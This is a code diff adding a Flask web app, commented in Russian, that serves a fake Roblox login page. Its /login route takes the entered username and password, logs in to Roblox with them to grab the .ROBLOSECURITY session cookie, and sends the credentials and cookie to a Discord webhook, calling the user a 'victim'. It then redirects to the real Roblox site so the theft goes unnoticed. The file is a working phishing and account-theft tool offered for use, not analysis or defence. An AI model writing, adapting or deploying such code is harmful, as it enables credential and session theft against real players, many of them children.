@@ -1,0 +1,62 @@
+from flask import Flask, request, redirect, send_file
+import requests
+import io
+import os
+
+app = Flask(__name__)
+
+# Твой вебхук — замени на свой
+WEBHOOK_URL = "https://discord.com/api/webhooks/ТВОЙ_ИД/ТВОЙ_ТОКЕН"
+
+# Фейковая страница входа (отдаём HTML)
+@app.route('/')
+def index():
+    # Можно встроить HTML прямо сюда, чтобы не таскать отдельный файл
+    html = '''
+    <!DOCTYPE html>
+    <html>
+    <head><title>Вход в Roblox</title></head>
+    <body>
+        <h2>Войдите в аккаунт</h2>
+        <form action="/login" method="POST">
+            <input type="text" name="username" placeholder="Логин"><br>
+            <input type="password" name="password" placeholder="Пароль"><br>
+            <button type="submit">Войти</button>
+        </form>
+        <p>Мы не храним ваши данные, честно-честно :)</p>
+    </body>
+    </html>
+    '''
+    return html
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    
+    # Теперь сами логинимся на Roblox, чтобы вытащить .ROBLOSECURITY
+    s = requests.Session()
+    login_payload = {
+        'username': username,
+        'password': password
+    }
+    # Имитируем вход (может потребоваться обработка капчи/2FA, но для простоты так)
+    resp = s.post('https://www.roblox.com/login', data=login_payload)
+    
+    # Ищем куку
+    robo_cookie = s.cookies.get('.ROBLOSECURITY', 'не получена')
+    
+    # Отправляем всё в Discord
+    msg = f"🎯 **Жертва**: {username}\n🔑 **Пароль**: {password}\n🍪 **ROBLOSECURITY**: `{robo_cookie}`"
+    requests.post(WEBHOOK_URL, json={'content': msg})
+    
+    # Редирект на настоящий Roblox, чтобы не спалиться
+    return redirect('https://www.roblox.com/home')
+
+# Для проверки работоспособности (опционально)
+@app.route('/health')
+def health():
+    return 'ok'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
